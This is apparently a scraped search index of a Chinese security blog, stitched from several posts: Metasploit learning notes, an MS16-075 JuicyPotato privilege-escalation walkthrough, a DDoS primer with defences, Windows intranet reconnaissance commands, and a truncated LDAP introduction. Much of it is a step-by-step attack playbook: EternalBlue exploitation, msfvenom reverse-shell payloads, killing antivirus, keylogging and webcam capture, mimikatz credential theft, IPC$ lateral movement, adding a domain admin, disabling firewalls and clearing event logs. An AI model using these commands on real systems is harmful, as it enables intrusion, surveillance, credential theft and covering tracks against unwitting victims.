setg, unsetg # 用于在msfconsole中设置或取消设置全局性的参数，从而避免重复输入相同的值 使用常用的辅助模块进行服务扫描(search scanner) 2.主机发现 ## 用于主机发现的辅助模块，位于 modules/auxiliary/scanner/discovery use /auxiliary/scanner/discovery/arp_sweep 还是nmap速度快, 可以直接在msf中使用nmap 3.端口扫描 search portscan auxiliary/scanner/portscan/ack auxiliary/scanner/portscan/syn # 推荐这个(速度快，准确，不易被发现) auxiliary/scanner/portscan/xmas auxiliary/scanner/portscan/ftpbounce auxiliary/scanner/portscan/tcp use ...... show options set xxx 4.探测服务详细信息 5.服务查点 用户服务扫描和查点的工具，通常以[server_name]_version命名 telnet服务查点(查哪些主机开了telnet服务，而namp是查看某主机开放了哪些服务) SSH服务查点 use auxiliary/scanner/ssh/ssh_version # 口令爆破 use auxiliary/scanner/ssh/ssh_login MSSQL服务查点 use auxiliary/scanner/mssql/mssql_version 永恒之蓝实践 # 先扫描是否存在 use auxiliary/scanner/smb/ms17_010_eternalblue ... # 载利用攻击模块 use exploit/windows/smb/ms17_010_eternalblue set payload windows/x64/meterpreter/reverse_tcp set RHOST ... ... exploit 漏洞利用 收集完信息后，选择正确的exploit，payload 这里假设是Samba info exploit/multi/samba/usermap_sript, 可以查看到利用成功率Rank越高，成功率越大 use exploit/multi/samba/usermap_sript show options set PAYLOAD cmd/unix/reverse … … Bypass UAC use exploit/windows/local/bypassuac set session 1 run Meterpreter（属于后渗透攻击） Metasploit框架中的一个扩展模块 作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接 https://www.cnblogs.com/backlion/p/9484949.html Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。 # 优势 - 纯内存工作模式，不需要对内存进行写入操作 - 使用加密通信协议，且可以同时与几个信道通信 - 在被攻击进程内工作，不需要创建新的进程 - 易于在多进程之间迁移 - 平台通用 进程迁移 刚获取Meterpreter shell的时候，是脆弱的(用户随时可能关闭)，所以第一时间是移动shell，把它和一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作(更不易被发现) ps # 获取目标正在运行的进程 getpid # 查看Meterpreter shell的进程号 mirate 448 # 把shell移动到PID为448的进程里(因为这里这个稳定，看情况来吧) getpid # 发现shell的进程迁移OK(原来的进程会自动关闭，如果没关闭就手动关掉：kill xxx_pid) # 自动迁移进程指令(系统会自动寻找合适的进程然后迁移) run post/windows/manage/migrate 常用命令 ########## 系统命令（收集系统信息） systeminfo # 查看系统信息 run post/windows/gather/checkv # 检查是否为虚拟机 idletime # 目标机器最近运行时间 ifconfig/ipconfig # 查看网卡信息 route # 查看路由信息，设置路由（做跳板用） background # 把会话放到后台，这个会话继续保持 sessions # 查看会话列表 sessions -i 2 # 进入切回会话2 getuid # 获取当前用户id权限 run post/windows/manage/killav # 关闭杀毒(其他命令自己探索) run post/windows/manage/enable_rdp # 开启目标机器的远程桌面 run post/windows/manage/autoroute # 查看目标机的本地子网情况 # 接着进行跳转 background # 把当前终端隐藏在后台 route add 192.168.0.111 255.255.255.0 1 # 给指定会话id添加路由(可以添加其他地址到被攻陷的机器的路由表上，借助被攻陷的机器来攻击其他网络) route print # 查看路由添加结果 # 接着查看 run post/windows/gather/enum_logged_on_users # 列举当前有多少用户登录了主机 run post/windows/gather/enum_logged_on_users # 继续列举安装在目标机器上的应用 run post/windows/gather/credentials/windows_autologin # 很多用户习惯将计算机设置自动登录(抓取自动登录的密码)，如果看不到任何信息，就需要拓展插件Expia load espia # 先加载该插件 screengrab # 就可以抓取此时目标机器的屏幕截图 screenshot # 也是截屏 webcam snap # 打开目标机器摄像头，拍摄一张照片 webcam_stream # 开始摄像头(直播模式)，在浏览器输入给出的url发那个问即可 shutdown # 关机 shell # 进入目标系统的shell下面 exit # 停止meterpreter会话（也可以停止shell并返回到meterpreter） quit # 关闭当前的Meterpreter会话，返回MSF终端 ########## 文件系统命令 pwd / getwd # 查看目标机器当前目录 getlwd # 查看本机当前目录 cd # 切换目录(注意\\的转义) ls # 查看当前目录内容 search -f *.txt -d c: # 搜索文件（search -h 查看帮助） -d指定目录， -f搜索模式 upload /var/www/test.txt c:\\ # 上传文件到目标机器的路径 download c:\\test.txt # 下载文件(默认保存到msf的目录) cat # 查看文件内容 edit # 编辑文件 execute -f c:\\\\windows\\\\system32\\\\calc.exe # 执行文件 run keylogrecorder .... # 键盘记录？ 后渗透攻击：提权 纵向提权 横向提权 # 获取Meterpreter ","date":"2020-05-09","objectID":"/metasploit%E5%88%9D%E5%AD%A6-%E6%95%A3%E8%AE%B0/:2:0","tags":["Metasploit"],"title":"Metasploit初学-散记","uri":"/metasploit%E5%88%9D%E5%AD%A6-%E6%95%A3%E8%AE%B0/"},{"categories":["渗透测试"],"content":"一些小思路 信息搜集 当拿下第一天内网主机的权限(提权不了时)，就要以此服务器为跳板攻击其他服务器 先进行网络/用户组/DC等的收集 获取另外一台服务器权限 若权限不够导致不能直接攻击域服务器 使用meterpreter当前拥有的权限添加到内网路由，进行弱口令扫描 用Powershell对内网进行扫描 架设Socks4a, 然后socks会自动进行内网扫描 利用当前权限进行内网IPC$渗透 其他 通过分析，我们输入net view, 发现列举的机器选择一个和我们机器名相似的服务器试，成功率一般很高net use \\\\WIN7_TEST2\\c$ 使用经典的IPC$入侵（通过win默认启动的ipc共享来获得计算机控制权）： net use \\192.168.0.112\\ipc$ # 连接这个ip的ipc共享 copy srv.exe \\192.168.0.112\\ipc$ # 复制srv(免杀的payload)到目标 net time \\192.168.0.112 # 查看时间 at \\192.168.0.112 18:18 srv.exe # 用at命令在18点18分启动srv.exe (这里设置的时间要比主机时间快) # 如果没有 at命令，试试新的计划任务命令： schtask # 回到msf的handler进行监听，到时间会反弹shell 然后进入这个新的主机，查看包括权限在内的信息, 也可以mimikatz抓密码: run /post/windows/gather/mimikatz 也可以上传对应位数的mimikatz到该主机 upload /home/x64.exe c:\\ shell # 进入到目标的shell，再执行 Powershell寻找域管在线服务器 使用PowerView脚本的Invoke-User Hunter上传到目标机器，然后执行Invoke-UserHunter powershell.exe -exec bypass -Command \"\u0026{Import-Module .powerview.ps1;Invoke-UserHunter}\" 找到域管理员当前在线登录的主机后，入侵该主机，然后把它迁移到域管理员登录所在的进程，这样就有了域管的理的权限 获取域管权限 渗透域控 # 先尝试 getsystem getuid #查看当前用户，因为之前知道这账户的域管理员 ps # 找到域管理所在进程 migrate 30560 # 迁移进程过去(也可以用msf中窃取令牌的功能) # 查看主域控的IP shell # 先进去cmd net time # 使用IPC$入侵来返回一个域控的meterpreter shell(操作见上面的步骤) net user test test123 /ad /domain # 添加域管理员 net group \"domain admins\" /domain #查看域管理员是否添加成功 登录域控 下面要登录域控，抓取hash 常见的登录域控的方法： - 利用IPC上传AT\u0026Achtasks远程执行命令 - 利用端口转发或Socks登录DC的3389 - 登录对方内网一台主机使用PsTools工具包中的PsExec来反弹shell - 使用msf下的PsExec，psexec_psh, Impacket psexec, pth-winexe, Empire Invoke-Psexec等PsExec类工具反弹shell - 使用msf下的smb_login反弹shell - 使用WMI来进行攻击 - 使用PsRemoting posershel远程执行命令 - 其他 最常见的是msf下的PsEcex反弹meterpreter(1.msf下的PsEcex模块 2.cuestom模块,建议使用Veil之类的工具来生成免杀的payload) use /exploit/windows/smb/psexec set smbuser test set smbpass test123 set smbdomain HACKER set rhost 192.168.0.111 run # 获得反弹的meterpreter shell之后，先迁移进程，查看DC的系统系统和sesssion控制图 ps migrate 2166 getuid sysinfo sessions # 查看我们获取的sessions # 抓hash方法： - msf自带的hashdump(有system权限才可以)或smart_dump模块导出用户的Hash - 使用PowerShell的相应模块导出hash - 使用WCE、Mimikatz等工具 - 其他 SMB爆破内网 有了DC的密码，接下来只需快速在内网扩大控制权限 利用当前获取的DC的账户密码，对整个域控的IP短进行扫描 使用SMB下的smb_login模块 端口转发或socks代理进内网 ## 先在msf添加路由，然后使用smb_login模块Huo psexec_Scanner模块进行爆破 background route add 192.168.0.115 255.255.255.0 2 # 目的是访问1192.168.0.115将通过meterpreter的会话 2 来访问： search smb_login use auxiliary/scanner/smb/smb_login set ... run # 扫描内网 creds # 然后获得大量内网服务器的密码，下面就可以畅游内网了 # 可以使用Meterpreter的端口转发，也可以使用Metasploit下的Socks4a模块或第三方软件(这里使用简单的第一种) portfwd add -l 5555 -p 3389 -r 127.0.0.1 background 清理日志 步骤 删除之前添加的域管理员的帐号 删除所有在渗透中使用的工具 删除应用程序、系统和安全日志 关闭所有的Meterpreter连接 net user test /dels clearev # 删除日志 sessions sessions -K # 关闭所有msf连接 ","date":"2020-05-09","objectID":"/metasploit%E5%88%9D%E5%AD%A6-%E6%95%A3%E8%AE%B0/:3:0","tags":["Metasploit"],"title":"Metasploit初学-散记","uri":"/metasploit%E5%88%9D%E5%AD%A6-%E6%95%A3%E8%AE%B0/"},{"categories":["渗透测试"],"content":" 光看网上的文章是不够的，还是要多动手才行 ms16-075漏洞简介 Windows SMB 服务器特权提升漏洞（CVE漏洞编号：CVE-2016-3225）当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时，Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞，成功利用此漏洞的攻击者可以使用提升的特权执行任意代码。 漏洞详情，请戳这里 开始动手 1.假设是msfvenom生成木马，目标执行了，监听会话，获得meterpreter会话权限 msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.0.103 lport=4444 -f exe \u003e shell.exe 2.先看一下当前权限(确保我没有作弊) 3.查看系统信息，并导出 # (进入cmd) shell chcp 65001 # 将编码格式改为utf-8中文 systeminfo \u003e\u003e c:\\out.txt 将系统信息输出到out.txt文件 4.在meterpreter把结果文件下载到本地 download D:\\\\xxxx\\\\upload\\\\out.txt /tmp/out.txt 5.这里选择Windows-Exploit-Suggeste提权辅助工具，对结果文件在本地进行分析, 查找系统未打补丁有哪些 python windows-exploit-suggester.py --update python windows-exploit-suggester.py -i out.txt -d 2020-05-09-mssb.xls -l # -i是systeminfo的结果文件 可以看到可能存在ms16-075漏洞 6.开始验证 # 上传ms16-075的exp: JuicyPotato.exe至靶机 upload /root/Desktop/JuicyPotato.exe C:\\\\ execute -cH -f C:\\\\JuicyPotato.exe # 执行poc(前面已经把poc上传到目标了), 创建新的进程 impersonate_token \"NT AUTHORITY\\\\SYSTEM\" # 窃取, 假冒目标主机上的可用令牌 7.查看当前权限，提取成功 getuid # 查看当前权限 8.后面的事情，嘿嘿你懂得 这里只是没有防护的情况下的一次简单实验，有点简陋有点水 ","date":"2020-05-09","objectID":"/ms-16075%E6%8F%90%E6%9D%83windows-server-2008/:0:0","tags":["渗透测试","烂土豆","提权","ms-16075"],"title":"ms-16075提权Windows Server 2008","uri":"/ms-16075%E6%8F%90%E6%9D%83windows-server-2008/"},{"categories":["Python"],"content":"感觉这篇文章写的不错： 点击这里 ","date":"2020-05-08","objectID":"/python%E8%BF%9B%E7%A8%8B%E4%B9%8B%E9%97%B4%E5%85%A8%E5%B1%80%E9%94%81-gil/:0:0","tags":["Python","全局锁","GIL"],"title":"python进程之间全局锁(GIL)","uri":"/python%E8%BF%9B%E7%A8%8B%E4%B9%8B%E9%97%B4%E5%85%A8%E5%B1%80%E9%94%81-gil/"},{"categories":["渗透测试"],"content":" 之前以为DDos很简单，现在发现学问还是大滴很呢！！！ ","date":"2020-05-08","objectID":"/ddos%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/:0:0","tags":["渗透测试","DDos"],"title":"DDoS入门学习","uri":"/ddos%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"理论 DDOS简介 DDOS(Distributed Denial of Service)，又称分布式拒绝服务攻击。 是指处于不同位置的多个攻击者同时向一个或数个目标发动攻击，或者一个攻击者控制了位于不同位置的多台机器并利用这些机器对受害者同时实施攻击。由于攻击的发出点是分布在不同地方的，这类攻击称为分布式拒绝服务攻击，其中的攻击者可以有多个。 分布式拒绝服务攻击方式在进行攻击的时候，可以对源IP地址进行伪造，这样就使得这种攻击在发生的时候隐蔽性是非常好的，同时要对攻击进行检测也是非常困难的，因此这种攻击方式也成为了非常难以防范的攻击。 DDOS危害 出口带宽堵死 游戏掉线导致客户流失 服务器连接数多，连接资源被耗尽 服务器卡、慢、死机、无法连接 流量特点 IP地址随机或固定某些IP段随机 没有完整完成三次握手 地址多数是伪造的 请求数量大、快 DDOS攻击类型与防御 1.Smurf攻击 攻击者向网关(网络广播地址)发送ICMP请求包，并将该ICMP请求报文的源地址伪造成受害主机IP地址，目的地址为广播地址。路由器在接受到该数据包，发现目的地址是广播地址，就会将该数据包广播出去，局域网内所有的存活主机都会受到一个ICMP请求包，源地址是受害主机IP。接下来受害主机就会收到该网络内所有主机发来的ICMP应答报文，通过大量返回的ICMP应答报文来淹没受害主机，最终导致网络阻塞，受害主机崩溃。下面是smurf攻击示意图（盗的图） 防护方案： 禁止路由器广播ICMP请求包； 禁止操作系统对广播发出的ICMP请求包做出响应； 配置防火墙静止来自你所处网络外部的ping包 2.TearDrop攻击 是一种畸形报文攻击，基于UDP的病态分片数据包的攻击方法。 通过设置错误的片偏移(IP分段)，使得数据包到达目的地时，服务器无法重新组合数据包，因为数据包的组合是通过片偏移来组装的，最终导致崩溃。对比一下正常IP数据包和错误IP数据包 这种攻击主要对旧的windows版本和Linux版本有效。 防护： 可以检测发来的数据包片偏移是否合法，如果合法在组装，不合法直接丢弃。比如这个：分片重组检查算法 3.Land Attack（着陆攻击） 攻击者发动Land Attack攻击时，需要先发出一个SYN数据包，并将数据包的源IP与目的IP都设置成要攻击的目标IP，这样目标在接收到SYN数据包后，会根据源IP回应一个SYN+ACK数据包，即和自己建立一个空连接，然后到达idel超时时间时，才会释放这个连接。攻击者发送大量这样的数据包，从而耗尽目标的TCP连接池，最终导致拒绝服务。 Kali Linux提供的很多工具，都可以实现伪造包的功能，如hping3。 防御方案： 这种攻击对早期系统有效。通过防火墙、路由设备，建立规则，丢弃源地址和目标地址相同的SYN、SYN+ACK的TCP。 4.YN FLOOD攻击 SYN FLOOD攻击是在TCP三次握手过程中产生的。 攻击者通过发送大量伪造的带有SYN标志位的TCP报文，与目标主机建立了很多虚假的半开连接，在服务器返回SYN+ACK数据包后，攻击者不对其做出响应，也就是不返回ACK数据包给服务器，这样服务器就会一直等待直到超时。这种攻击方式会使目标服务器连接资源耗尽、链路堵塞，从而达到拒绝服务的目的 防御： SYNCheck：使用防护设备，3次握手变成了6次握手，由防护设备检测SYN请求是否合法，通过后再由防护设备将报文转发给服务器，后续报文仍由防护设备代理。 Micro blocks：管理员可以在内存中为每个SYN请求创建一个小索引(小于16字节)，而不必把整个连接对象存入内存。 RST cookies：在客户端发起第一个SYN请求后，服务器故意回应一个错误的SYN+ACK报文。如果合法用户收到这个报文，就会给服务器响应RST报文。当服务器收到这个报文时，就将这个主机的IP记录进合法IP列表，下次该主机发起SYN请求时，就可以直接通过了。 STACK tweaking：管理员可以调整TCP堆栈以减缓SYN泛洪攻击的影响。这包括减小超时时间，等到堆栈存释内放时再分配连接，否则就随机性地删除传入的连接。 5.ACK FLOOD攻击 ACK FLOOD攻击是利用TCP三次握手过程。这里可以分为两种。 第一种： 攻击者伪造大量的SYN+ACK包发送给目标主机，目标主机每收到一个SYN+ACK数据包时，都会去自己的TCP连接表中查看有没有与ACK的发送者建立连接 ，如果有则发送ACK包完成TCP连接，如果没有则发送ACK+RST 断开连接。但是在查询过程中会消耗一定的CUP计算资源。如果瞬间收到大量的SYN+ACK数据包，将会消耗服务器的大量cpu资源，导致正常的连接无法建立或增加延迟，甚至造成服务器瘫痪、死机。 第二种： 利用TCP三次握手的ACK+SYN应答，攻击者向不同的服务器发送大量的SYN请求，这些SYN请求数据包的源IP均为受害主机IP，这样就会有大量的SYN+ACK应答数据包发往受害主机，从而占用目标的网络带宽资源，形成拒绝服务。 通常DDOS攻击会将ACK flood与SYN flood结合在一起，从而扩大威力。 防御方案参考： 采用CDN进行流量稀释； 避免服务器IP暴露在公网上； 通过限速或动态指纹的方式； 利用对称性判断来分析出是否有攻击存在； 在连续收到用户发送的ACK包时，中断回话，让其重连。 6.UDP FLOOD攻击(UDP泛洪攻击) 因为UDP不需要三次握手，这就造成UDP泛洪攻击不但效率高，而且还可以在资源相对较少的情况下执行。 UDP FLOOD可以使用小数据包(64字节)进行攻击,也可以使用大数据包(大于1500字节,以太网MTU为1500字节)进行攻击。 大量小数据包会增大网络设备处理数据包的压力； 而对于大数据包，网络设备需要进行分片、重组，最终达到的效果就是占用网络传输接口的带宽、网络堵塞、服务器响应慢等等。 防御方案： 限制每秒钟接受到的流量(可能产生误判)； 通过动态指纹学习(需要攻击发生一定时间)，将非法用户加入黑名单。 7.NTP放大攻击 NTP(Network Time Protocol，网络时间协议)，是用来使计算机网络时间同步化的一种协议，使用UDP123端口进行通信。 通常在NTP服务器上会有一些调试接口，而利用这些接口中的monlist请求，就可触发放大攻击。当主机向NTP服务器发送monlist查询请求时，NTP服务器会将与之进行时间同步的最后600个IP地址返回。所以攻击者只需要将源地址伪造为受害主机的IP，向NTP服务器发送一个monlist查询请求包，受害主机就会收到大量的UDP响应包。这种攻击在放大攻击里，危害相对较大。 这种攻击产生的原因： 请求与响应数据包不等价； UDP协议的通信模糊性（无数据传输确认机制）； 以及NTP服务器的无认证机制。 防御方案： 使用防 DDoS 设备进行清洗； 加固并升级NTP服务器； 在网络出口封禁 UDP 123 端口； 通过网络层或者借助运营商实施 ACL 来防御； 关闭现在 NTP 服务的 monlist 功能，在ntp.conf配置文件中增加disable monitor选项。 8.DNS放大攻击 DNS报文格式(借个图)： 首先，攻击者向僵尸网络发出指令，使僵尸网络中的每一台主机均发出一个伪造源地址的DNS查询请求包，这些请求包查询类型设置为ANY，因为这种类型会请求所有的记录，这些记录会在返回的响应包中，也就是说这种数据包的大小较其他类型是最大的。 接着查询类型设为递归查询，为什么不是迭代查询呢，仔细看两种查询的过程图可发现，如果迭代查询第一个请求的DNS服务器没有查询到结果，那么第一个请求的服务器会返回另一个DNS服务器IP，让请求主机向这个IP去继续查询，然而攻击者的数据包源地址是伪造的，所以并不会发起第二次查询，因为第一次查询根本就不是它发起的；而递归查询却是在查询到结果之后，才返回给查询请求发起者。 利用这两个特点，攻击者就可以成功发起DNS放大攻击。这种普通的查询请求可以将攻击流量放大2~10倍，如果想增大攻击倍数，可以使用RFC 2671中定义的DNS拓展机制EDNS0。未使用EDNS0时，若响应包大小小于512字节，就使用UDP封装数据；若响应包大小超过512字节，就使用TCP连接或者服务器截断响应报文，丢弃超过512字节的部分，并把TC位置1。这两种方式都不利于进行DNS放大攻击。然而在开启EDNS0机制后，增加了OPT RR字段，这两个字段包含了能够处理的最大UDP报文大小信息，所以攻击者将这个信息设置的很大，服务器就会根据这个信息生成响应报文。最后看一下DNS放大攻击演示图 # 四个步骤 1.攻击者使用受损端点将带有欺骗性IP地址的UDP数据包发送到DNS recursor(递归)。数据包上的欺骗地址指向受害者的真实IP地址。 2.每个UDP数据包都向DNS解析器发出请求，通常会传递诸如“ANY”之类的参数，以便接收可能的最大响应。 3.在收到请求后，尝试通过响应提供帮助的DNS解析器会向欺骗的IP地址发送大量响应。 4.目标的IP地址接收响应，周围的网络基础设施因流量泛滥而变得不堪重负，导致拒绝服务。 虽然一些请求不足以取消网络基础设施，但当此序列在多个请求和DNS解析器之间成倍增加时，目标接收的数据放大可能很大。 防御的话，可以参考以下几点： 联系ISP清洗上游流量； DNS服务器只对可信域内提供服务，限制对域外用户提供DNS解析服务； 对单个IP的查询速率做限制； 拥有足够的带宽承受小规模攻击； ","date":"2020-05-08","objectID":"/ddos%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/:1:0","tags":["渗透测试","DDos"],"title":"DDoS入门学习","uri":"/ddos%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"实践 暂时有待实践 参考(基本是完全参考大佬的，整理的太全了)： https://xz.aliyun.com/t/71 https://xz.aliyun.com/t/70 其他链接资源： https://www.freebuf.com/articles/network/76021.html https://www.cnblogs.com/wuyuan2011woaini/p/5800062.html https://www.cnblogs.com/micr067/p/12519779.html https://yq.aliyun.com/articles/480125/ kali下的DDos测试工具 ","date":"2020-05-08","objectID":"/ddos%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/:2:0","tags":["渗透测试","DDos"],"title":"DDoS入门学习","uri":"/ddos%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"二 . 内网信息收集 本机信息收集 1)查询网络配置 net view # 查看工作组 ipconfig /all # 也可以看到是否有域 2) 查询用户列表 net user # 查看本机用户列表 net localgroup administrators # 本机管理员（通常含有域用户） query user || qwinsta # 查看当前在线用户（提前看看管理员是否在线） # 企事业单位的用户名有规则性 3)查询进程列表 # 看装了什么软件,vpn,杀毒软件,虚拟机,某服务(推敲域内是否都装了这个软件) # 看进程运行的权限 tasklist /v # 或用wmic wmic process list brief 4) 查看本机服务信息 wmic service list brief 5) 查询操作系统及安装软件版本信息 # 获取操作系统和版本信息() systeminfo |findstr /B /C:\"OS Name\" /C:\"OS Version\" # 英文版本的话是这样 systeminfo |findstr /B /C:\"OS 名称\" /C:\"OS 版本\" # 中文版本的话是这样 # 查看系统体系结构 echo %PROCESSOR_ARCHITECTURE% # amd64 # 查看安装软件和版本、路径等 wmic product get name,version # powershell查看安装软件信息 powershell \"Get-WmiObject -class Win32_Product |Select-Object -Property name,version\" 6) 查询端口列表 netstat -ano # 根据端口综合判断，如果是内容用来更新的服务器/DNS服务器/代理服务器 7) 查询启动信息 wmic startup get command,caption 8) 查看计划任务 schtasks /query /fo LIST /v 9) 查看主机开机时间 net statistics workstation 10) 列出或断开本地计算机与所连接的客户端之间的会话 net session 11) 查询补丁信息 systeminfo #可以看到很多信息(域内主机补丁是批量打的) # 或用wmic wmic qfe get Caption,Description,HostFixID,InstalledOn 12) 查询本机共享 # 默认是开着C，IPC，ADMINS # 不单单是看本机的信息(通过本机判断域内情况) net share net share \\\\yourHostname wmic share get name,path,status # wmic： 是windows自带的一个命令工具，有很多功能(交互/非交互模式) 13) 查询路由表和所有可用的ARP缓存表 route print # arp -a 14) 查询防火墙配置 # '查看'防火墙配置 netsh firewall show config ## '关闭'防火墙(msf里面也有) #1.对win server 2003以及之前的版本 netsh firewall set opmode disable #2.win server 2003之后的版本 netsh advfirewall set allprofiles state off # 自定义防火墙日志储存位置 netsh advfirewall set currentprofile logging filename \"C:\\windows\\temp/fw.log\" ## '修改'防火墙相关配置(比关闭防火墙动静小，改完记得恢复规则) #1.对win server 2003以及之前的版本,允许指定程序全部连接 netsh firewall add allowprogram c:\\nc.exe \"allow nc\" enable #2.win server 2003之后的版本 允许指定程序连入 netsh advfirewall firewall add rule name=\"pass nc\" dir=in action=allow program=\"C: \\nc.exe\" 允许指定程序连出 netsh advfirewall firewall add rule name=\"Allow nc\" dir=out action=allow program=\"C: \\nc.exe\" 允许3389端口放行 netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow 15) 查看代理配置情况 reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" 16) 查询并开启远程连接服务（比较老的知识点） ##### 查看远程连接端口 Reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber ###### 开启的3389方法： # 1.通用 开3389(优化后)： wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 # 2.For Win2003: REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f # 或者 wimc path win32_terminalservicesetting where (__CLASS !=\"\") call setallowsconnections 1 # 3.For Win2008: REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f # 4.For Every: cmd开3389 win08 win03 win7 win2012 winxp # win08，三条命令；win2012通用；win7前两条即可(权限需要run as administrator): wmic /namespace:\\root\\cimv2 erminalservices path win32_terminalservicesetting where (__CLASS != \"\") call setallowtsconnections 1 wmic /namespace:\\root\\cimv2 erminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1 reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f 17) 自动化信息搜集 写一个脚本，把上面要搜集的信息都进行 WMIC(win管理工具命令行)的搜集信息的写好的脚本(执行该脚本后，会自动生成一个html文件) 链接 18) Empire下的主机信息搜集 1.Empire提供了用于收集主机信息的模块，输入命令usemodoule situational_awareness/host/winenum即可看到一些信息 2.usemodoule situational_awareness/host/computerdetails 包含了几乎所有有用的东西(但是运行这个模块需要管理员权限) 查询当前权限 whoami # 查询当前权限 获取到一台主机的权限后，有如下三种情况： 本地普通用户 本地管理员用户 （可以用来查询域内信息, 比如： net view /xx/yy） 域内用户(域名\\用户) 本地管理员权限默认和直接提升为Ntauthority或System权限，因此，在域中，除普通用户外，所有的机器都有一个机器用户(用户名是机器名+$)。本质上，机器的system用户对应的就是域里面的机器用户，所以使用system权限可以运行域内的查询命令 whoami /all # 获取域SID net user xxx /domain # 查询指定用户的详细信息 判断是否存在域 如果存在域，就需要判断所控主机是否在域内 几种方法： # 1. ipconfig /all # 可以查看网关IP地址、DNS的ip地址、域名、本机是否和dns处在同一网段 # 然后，可以通过nslookup反解析域名的ip地址，用解析得到的ip地址进行对比，判断DC和DNS是否在同一台服务器上 # 2.查看系统详细信息(有\"域\"的字段)，如果\"域\"为WORKGROUP则表示当前服务","date":"2020-05-08","objectID":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/:0:0","tags":["渗透测试","内网","信息搜集"],"title":"内网第二章-内网基础信息搜集","uri":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"},{"categories":["Linux"],"content":"LDAP 看书前先看目录 理解 不同于文件系统的目录(D/d) -\u003e 首字母大写是目录服务，首字母小写的文件系统目录 目录服务是企业网络的核心基础结构 - 如此重要的服务并不被大多数熟悉 - 很少独立使用，与其他服务结合使用 - 微软的企业战略（埋坑: 一旦底层用了微软的AD,你以后的一些肯定也要用我的集成的产品） - 类似: 每一本书都有自己的目录 数据集中存储的应用需求 - 集中存储、集中管理、集中定位 - 身份认证、公钥分发、邮件路由、地址查询、应用配置、单点登录(SSO -\u003e 只登录一次就不用重复登录了) - 面向大量频繁的数据查询操作，少量写操作（基本不变的数据） - 权限限制授权用户查询 我是否应该使用目录服务(根据自己公司情况) - 用户认证 - 机器认证 - 用户和组 - 电话地址薄 - 组织呈现 - 资产跟踪 - 集中应用配置 - PEX / 网络设备配置 DAP 软件架构 不同与SQL的后端层级化数据库（主要面向查询操作） 与DNS的分布式结构更接近，命名上通常与DBS命名保持一致(在目录服务内所有存储对象都有唯一的路径名称) 数据库基于键值对的方式存储数据 标准统一的服务前端应用查询访问接口(基于OSI协议栈, X.500) 统一的客户端查询组件和协议(C/S) 支持通信会话加密 Directory information tree (DIT) 与自建数据库开发相比 专门针对查询服务的数据库结构类型 统一标准的查询结构以及通信协议（DAP -\u003e目录访问协议） LDAP Lightweight Directoy Access Protocol 轻量目录访问服务 命名上通常与DBS命名保持一致(在目录服务内所有存储对象都有唯一的路径名称) 数据库基于键值对的方式存储数据 X.500标准的部分特性集, 各厂商不同 基于TCP/IP协议通信(TCP 389) 可构建面向互联网和本地网络的目录服务 最常见的LDAP服务 # 微软的活动目录 AD 企业网络资源全部加入域，统一存储、统一呈现、统一管理、安全边界 # Novell eDirectory 命名空间 # 全局路径： Distinguished Name (DN) # 相对路径： Relative Distinguished # 目录容器： Directory Container (DC) 每一层 # 组织单位: Organisation Unit (OU) 通常按照部门划分 # 数据项： entries (object, class) 一组预先定义的属性集合 uid, 姓，名，帐号，邮箱，电话, 照片... # 基础架构：Schema objectClass 定义所有对象类型及其属性 Schame 可按应用需要扩展(美国对象在ASN.1结构中都有自己的位置 -- SNMP) # 通用名： common name (CN) 传统命名空间 无固定的命名规则 按照地理空间命名 # 写法 uid=babs, ou=People, dc=example, dc=com LDAP协议 LDAP最初作为TCP/IP客户udan与X.500目录服务网关之间发通信协议 LDAPv3: 强身份认证和数据加密 基于证书的SSL加密 使用Unicode编码实现国际化 Schema可扩展 安装并配置LDAP 拿出一台服务器作为专门的LDAP的服务器，以后的身份认证都使用集中的LDAP的(不局限与操作系统，Web应用也可以，只要程序支持ldap就可以使用这个做身份认证) 先修改主机名： sudo sed -i 's/preserve_hostname:false /preserve_hostname:true /g' /etc/cloud/cloud.cfg echo \"192.168.0.104 ldap.lab.com\" | sudo tee -a /etc/hosts # ip地址与名称的解析关系 # 修改主机名 sudo 